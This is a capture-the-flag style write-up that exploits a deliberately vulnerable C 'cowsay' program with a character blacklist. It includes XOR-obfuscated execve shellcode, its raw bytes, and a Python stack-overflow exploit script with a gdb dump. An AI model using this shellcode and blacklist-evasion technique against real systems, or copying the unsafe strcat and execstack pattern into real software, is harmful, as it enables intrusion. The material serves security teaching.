# Shellcoding - Level 2

## Mission (Hackerproof Cowsay)

Using your last exploit, we managed to get a foothold in their network! Unfortunately, our operations guys got caught pretty quickly, and the target organization pushed up a patched version of cowsay that breaks your exploit!

Can you take a look at this one? It has some hacker-detection built in, but we're sure you're up to the challenge!!


## Source Code

```c
// gcc -g -I ../includes -z execstack -fno-stack-protector -no-pie -o 04_level_2 04_level_2.c
#include <stdio.h>
#include <string.h>

// Hidden for simplicity
#include "wargames.h"
#include "visualize.h"

int check_for_hacks(const char * buffer)
{
    size_t len = strlen(buffer);
    for (int i = 0; i < len; i++)
    {
        // Hackers seem to use these a lot hmm
        if (buffer[i] == 0x3b ||
                buffer[i] == '/' ||
                buffer[i] == 'b' ||
                buffer[i] == 'i' ||
                buffer[i] == 'n' ||
                buffer[i] == 's' ||
                buffer[i] == 'h')
            return 0;
    }

    // Buffer is OK
    return 1;
}

void cowsay(const char * text)
{
    // Print top of speech bubble
    printf("    ");
    for (int i = 0; i < strlen(text) + 2; i++)
        printf("-");
    printf("\n");

    // Print speech text
    printf("   < %s >\n", text);

    // Print bottom of speech bubble
    printf("    ");
    for (int i = 0; i < strlen(text) + 2; i++)
        printf("-");
    printf("\n");

    // Print an ASCII cow
    printf("           \\   ^__^             \n");
    printf("            \\  (oo)\\_______     \n");
    printf("               (__)\\       )\\/\\ \n");
    printf("                   ||----w |    \n");
    printf("                   ||     ||     \n");
    printf("        .--+--o--------+------\\+/-----.\n");
}

void main()
{
    init_wargame();

    printf("------------------------------------------------------------\n");
    printf("--[ Shellcode Level #2 - Cowsay v2.0                        \n");
    printf("------------------------------------------------------------\n");

    // Buffer to hold user input & final cowsay text
    char text[128] = {};
    char buffer[128] = {};

    // Prompt the user for some cow-friendly text
    printf("Enter a string to cowsay: ");
    fgets(buffer, sizeof(buffer), stdin);
    buffer[strcspn(buffer, "\n")] = 0;

    // Build the final cowsay message, with some added mooing
    strcat(text, "mo00oooo00o0o... ");
    strcat(text, buffer);

    // Clear the original user input buffer off the stack
    memset(buffer, 0, sizeof(buffer));

    // Validate the text before printing it, to ensure no funny-business
    if (check_for_hacks(text)) {
        cowsay(text);
    } else {
        printf(CYELLOW"/!\\"CRESET" "CRED"HACKING DETECTED"CRESET" "CYELLOW"/!\\"CRESET"\n");
        exit(-1);
    }

    // Exit the program / return from main
}
```

The code here pretty much the same as in level 1, apart from one noticable change. The main function now has an conditional block when calling the `cowsay` function: 

```c
     // Validate the text before printing it, to ensure no funny-business
 92     if (check_for_hacks(text)) {
 93         cowsay(text);
 94     } else {
 95         printf(CYELLOW"/!\\"CRESET" "CRED"HACKING DETECTED"CRESET" "CYELLOW"/!\\"CRESET"\n");
 96         exit(-1);
 97     }
```
Within the if statement, a call is made to `check_for_hacks` with the user supplied `buffer` char array as an argument. If the call returns the result as true, the `cowsay` function will then execute. Alternatively, if the return value from the call to `check_for_hacks` is false, the program is exited with the message `HACKING DETECTED` printed to the terminal.


At the moment, we know what the check_for_hacks function is doing to make it's decision based on the source code. To better understand this from the assembly point of view, we can review the disassembly for `check_for_hacks` :

```asm
0x4008bd:  push    rbp
0x4008be:  mov     rbp, rsp
0x4008c1:  sub     rsp, 0x20
0x4008c5:  mov     qword [rbp-0x18], rdi
0x4008c9:  mov     rax, qword [rbp-0x18]
0x4008cd:  mov     rdi, rax
0x4008d0:  call    strlen
0x4008d5:  mov     qword [rbp-0x10], rax
0x4008d9:  mov     dword [rbp-0x4], 0x0
0x4008e0:  jmp     0x40097c
0x4008e5:  mov     eax, dword [rbp-0x4]
0x4008e8:  movsxd  rdx, eax
0x4008eb:  mov     rax, qword [rbp-0x18]
0x4008ef:  add     rax, rdx
0x4008f2:  movzx   eax, byte [rax]
0x4008f5:  cmp     al, 0x3b
0x4008f7:  je      0x400971
0x4008f9:  mov     eax, dword [rbp-0x4]
0x4008fc:  movsxd  rdx, eax
0x4008ff:  mov     rax, qword [rbp-0x18]
0x400903:  add     rax, rdx
0x400906:  movzx   eax, byte [rax]
0x400909:  cmp     al, 0x2f
0x40090b:  je      0x400971
0x40090d:  mov     eax, dword [rbp-0x4]
0x400910:  movsxd  rdx, eax
0x400913:  mov     rax, qword [rbp-0x18]
0x400917:  add     rax, rdx
0x40091a:  movzx   eax, byte [rax]
0x40091d:  cmp     al, 0x62
0x40091f:  je      0x400971
0x400921:  mov     eax, dword [rbp-0x4]
0x400924:  movsxd  rdx, eax
0x400927:  mov     rax, qword [rbp-0x18]
0x40092b:  add     rax, rdx
0x40092e:  movzx   eax, byte [rax]
0x400931:  cmp     al, 0x69
0x400933:  je      0x400971
0x400935:  mov     eax, dword [rbp-0x4]
0x400938:  movsxd  rdx, eax
0x40093b:  mov     rax, qword [rbp-0x18]
0x40093f:  add     rax, rdx
0x400942:  movzx   eax, byte [rax]
0x400945:  cmp     al, 0x6e
0x400947:  je      0x400971
0x400949:  mov     eax, dword [rbp-0x4]
0x40094c:  movsxd  rdx, eax
0x40094f:  mov     rax, qword [rbp-0x18]
0x400953:  add     rax, rdx
0x400956:  movzx   eax, byte [rax]
0x400959:  cmp     al, 0x73
0x40095b:  je      0x400971
0x40095d:  mov     eax, dword [rbp-0x4]
0x400960:  movsxd  rdx, eax
0x400963:  mov     rax, qword [rbp-0x18]
0x400967:  add     rax, rdx
0x40096a:  movzx   eax, byte [rax]
0x40096d:  cmp     al, 0x68
0x40096f:  jne     0x400978
0x400971:  mov     eax, 0x0
0x400976:  jmp     0x400990
0x400978:  add     dword [rbp-0x4], 0x1
0x40097c:  mov     eax, dword [rbp-0x4]
0x40097f:  cdqe
0x400981:  cmp     qword [rbp-0x10], rax
0x400985:  ja      0x4008e5
0x40098b:  mov     eax, 0x1
0x400990:  leave
0x400991:  retn

```

Looking at the disassembly, we an see there are a number of checks in place. We'll work through understanding each check separately. 

### Check 1

```asm
0x4008bd:  push    rbp
0x4008be:  mov     rbp, rsp
0x4008c1:  sub     rsp, 0x20
0x4008c5:  mov     qword [rbp-0x18], rdi
0x4008c9:  mov     rax, qword [rbp-0x18]
0x4008cd:  mov     rdi, rax
0x4008d0:  call    strlen
0x4008d5:  mov     qword [rbp-0x10], rax
0x4008d9:  mov     dword [rbp-0x4], 0x0
0x4008e0:  jmp     0x40097c
```
- Aside from the function prologue, we can see 32 bytes is alloated to the stack. 
- The pointer `text` argument to the `check_for_hacks` function is received in the rdi register, then moved to `rbp-0x18`.
- rbp-0x18 (text string) is copied to rax, then to rdi
- The strlen function is called with with rdi as the first arg, which is the text we supply to it
- The return result (length of the text) is stored in rax, then copied to `rbp-0x10`
- 0 is moved into `rbp-0x4` followed by a jmp instruction to `0x40097c`

When we review the remaining instructions at 0x40097c, we can see a comparison is made:

```asm
0x40097c:  mov     eax, dword [rbp-0x4]
0x40097f:  cdqe
0x400981:  cmp     qword [rbp-0x10], rax
0x400985:  ja      0x4008e5
0x40098b:  mov     eax, 0x1
0x400990:  leave
0x400991:  retn
```
A comparison is made between `rax` (which has the value `0` from rbp-0x4) and `rbp-0x10` (which has the length of our text). If the length of the text is greater than zero we pass the check and execution will `jmp` to `0x4008e5`. Alternatively, if it's zero or below, 1 is moved into eax and returned to caller followed by the function exiting.


### Check 2

```asm
0x4008e5:  mov     eax, dword [rbp-0x4]
0x4008e8:  movsxd  rdx, eax
0x4008eb:  mov     rax, qword [rbp-0x18]
0x4008ef:  add     rax, rdx
0x4008f2:  movzx   eax, byte [rax]
0x4008f5:  cmp     al, 0x3b
0x4008f7:  je      0x400971
```

- This takes rbp-0x4 (currently 0), moves it to eax then to rdx
- The pointer to the text string in rbp-0x18 is moved to rax, then has the value in rdx (0) added to it
- The first byte from the string (in rax) is eax, then compared to `0x3b`
- If the comparison was equal, `jmp` to `0x400971`

Looking at 0x400971, we see the following:

```asm
0x400971:  mov     eax, 0x0
0x400976:  jmp     0x400990
0x400978:  add     dword [rbp-0x4], 0x1
0x40097c:  mov     eax, dword [rbp-0x4]
0x40097f:  cdqe
0x400981:  cmp     qword [rbp-0x10], rax
0x400985:  ja      0x4008e5
```
- If the first byte matches 0x3b, then the program exits and 0 is returned to the caller. This would be our failure condition, which would result in the message "HACKING DETECTED" printed to the terminal.
- If the first byte did not match, add 1 to rbp-0x4, compare this with the length of the text string again, and jump to 0x4008e5 if rbp-0x10 is greater

This behaviour forms a loop, and continues througout the program. From this fact can determine the following:

- The check on the user supplied text string, will search through the whole string for specific characters. If any are found, the program exits and alerts Hacking Detected
- The characters being checked are: `0x3b`, `0x2f`, `0x62`, `0x69`, `0x6e`, `0x73`, `0x68`
- This maps to the ascii characters `bin/sh`. The `0x3b` is added because the number in decimal is 59 and is syscall number for `exceve`.


## Our Goal

Now we know the checks being made in the `check_for_hacks` function, we have a clear idea of what we need to do to bypass them. To solve this challenge and get a shell, we need to:

- Find an alternative binary file to execute to get a shell
- Use a different syscall (Not exceve)
- Alternatively, obfuscate the bin/sh and exceve syscall number in the shell code


## Solving the challenge

There's a few ways I thought about doing this one, but only one makes the most sense. Nevertheless, let's discuss the options and which one is best. 

### Option 1 - Find an alternative binary to get a shell

This would be quite a difficult one to do, but techincally possible. We are still limited by the `bin` and `sh` charcters being checked, so we couldn't call another shell. We could attempt to use a living off the land binary and try to get a shell that way, but we have a limited amount of space to work with, plus we still need to take care of getting pass the check for `0x3b` (quite simple tbh, but more on that later). In short, the restriction on not using `/` and `bin` severely limits us with `exceve` because it expects the path to the filename. I didn't try a filename without the path, but pretty sure it would fail.


### Option 2 - Use a different Syscall

This seem like a good idea at first, but there's actually not many options with this one. From what I've seen, `fork` could be used as a syscall, but this would only copy the running process into a new process, hence we would still be in a new instance of the program without a shell :cry: No other syscalls really seemed viable


### Option 3 - Obfuscate the payload

This is a much better idea. The `check_for_hacks` function is only checking for the hex characters in our string input, so if we can somehow obfuscate it and still get the string payload to be interpreted as assembly instructions, then we can achieve our goal. 

It turns out this is pretty easy with `XOR`. XOR is a logic gate that will output a `true` if only one of the inputs the inputs is true. If both inputs are `true` or `both` are false, then the output is false (hence the name `exclusive or`). In terms of code, XOR is best understood in binary terms.


Let say we want to do 8 XOR 10 ( 8 ^ 10 ):

 8 4 2 1 --- (binary place value)
 -------------------------------

 1 0 0 0 --- (8 in binary)
 -------------------------------
^1 0 1 0 --- (10 in binary)
 -------------------------------
 -------------------------------
 0 0 1 0 --- (The binary result: 2)

 We can check this is python

 ```bash
>>> 8 ^ 10
2
 ```

The because XOR works as an inverter, we can use one of the numbers e.g `10` and XOR this with the XOR'd output of (8 ^ 10) to get back the value of `8`. 

```bash
>>> 10 ^ 2
8
```
So how can we use this to our advantage? 


The XOR instruction is available in assembly, so we can use this in our shellcode. What we can do to obfuscate the payload is XOR the char array `bin/sh//` with some random number of the same size char length. For example:

```python
hex(0x68732f6e69622f2f ^ 0x23db8ade130f6ade)
```
We can use the output of this number `0x4ba8a5b07a6d45f1` and XOR it with the other random number `0x23db8ade130f6ade` to get back to the characters `bin/sh//` :tada


Now we just have to solve the restriction on using the exceve syscall number 59 `0x3b`. Since the check explicity looks for the characters `0x3b`, we can just send in `0x3a` and another assembly instruction to add `1` to the same register :satisfied:


### Modified Assembly instructions

```asm
xor rax, rax
push rax
mov r10, 0x23db8ade130f6ade
mov r9, 0x4ba8a5b07a6d45f1
xor r10, r9
push r10
mov rdi, rsp
xor rsi, rsi
xor rdx, rdx
mov al, 0x3a
add al, 0x1
syscall
```

### Bytes from the assembled instructions

```
Raw Bytes:
4831C05049BADE6A0F13DE8ADB2349B9F1456D7AB0A5A84B4D31CA41524889E74831F64831D2B03A04010F05

Python Escaped:
"\x48\x31\xC0\x50\x49\xBA\xDE\x6A\x0F\x13\xDE\x8A\xDB\x23\x49\xB9\xF1\x45\x6D\x7A\xB0\xA5\xA8\x4B\x4D\x31\xCA\x41\x52\x48\x89\xE7\x48\x31\xF6\x48\x31\xD2\xB0\x3A\x04\x01\x0F\x05"

Disassembly:
0:  48 31 c0                xor    rax,rax
3:  50                      push   rax
4:  49 ba de 6a 0f 13 de    movabs r10,0x23db8ade130f6ade
b:  8a db 23
e:  49 b9 f1 45 6d 7a b0    movabs r9,0x4ba8a5b07a6d45f1
15: a5 a8 4b
18: 4d 31 ca                xor    r10,r9
1b: 41 52                   push   r10
1d: 48 89 e7                mov    rdi,rsp
20: 48 31 f6                xor    rsi,rsi
23: 48 31 d2                xor    rdx,rdx
26: b0 3a                   mov    al,0x3a
28: 04 01                   add    al,0x1
2a: 0f 05                   syscall
```

### New Python script

```python
import interact
import struct

# Pack integer 'n' into a 8-Byte representation
def p64(n):
    return struct.pack('Q', n)

# Unpack 8-Byte-long string 's' into a Python integer
def u64(s):
    return struct.unpack('Q', s)[0]

shellcode = "\x48\x31\xC0\x50\x49\xBA\xDE\x6A\x0F\x13\xDE\x8A\xDB\x23\x49\xB9\xF1\x45\x6D\x7A\xB0\xA5\xA8\x4B\x4D\x31\xCA\x41\x52\x48\x89\xE7\x48\x31\xF6\x48\x31\xD2\xB0\x3A\x04\x01\x0F\x05"

p = interact.Process()
data = p.readuntil('Enter a string to cowsay: ')
p.sendline('A' * 55 + shellcode + '\x90' * 4 + '\x90' * 16 + '\x98\xed\xff\xff\xff\x7f\x00\x00' )   # \x90 for byte alignment
                                                                                                    # \x98\xed\xff\xff\xff\x7f\x00\x00 is the memory address of where the shellcode starts
p.interactive()
```

In gdb, this would look like the following in memory:

```gdb
Breakpoint 2: 0x400baa, main+265
wdb> ni
0x400baf in main ()
wdb> x/48gx $rbp-0x100
0x7fffffffecd0: 0x4141414141414141    0x4141414141414141
0x7fffffffece0: 0x4141414141414141    0x4141414141414141
0x7fffffffecf0: 0x4141414141414141    0x4141414141414141
0x7fffffffed00: 0x4841414141414141    0x0f6adeba4950c031
0x7fffffffed10: 0xf1b94923db8ade13    0x4d4ba8a5b07a6d45
0x7fffffffed20: 0x48e789485241ca31    0x043ab0d23148f631
0x7fffffffed30: 0x9090909090050f01    0x9090909090909090
0x7fffffffed40: 0x9890909090909090    0x0000007fffffffed
0x7fffffffed50: 0x6f6f6f6f30306f6d    0x2e2e2e6f306f3030
0x7fffffffed60: 0x4141414141414120    0x4141414141414141
0x7fffffffed70: 0x4141414141414141    0x4141414141414141
0x7fffffffed80: 0x4141414141414141    0x4141414141414141
0x7fffffffed90: 0x4141414141414141    0x6adeba4950c03148    # Start of shellcode
0x7fffffffeda0: 0xb94923db8ade130f    0x4ba8a5b07a6d45f1
0x7fffffffedb0: 0xe789485241ca314d    0x3ab0d23148f63148
0x7fffffffedc0: 0x90909090050f0104    0x9090909090909090
0x7fffffffedd0: 0x9090909090909090    0x00007fffffffed98    # Overwitten Return address pointing to start of shellcode
```
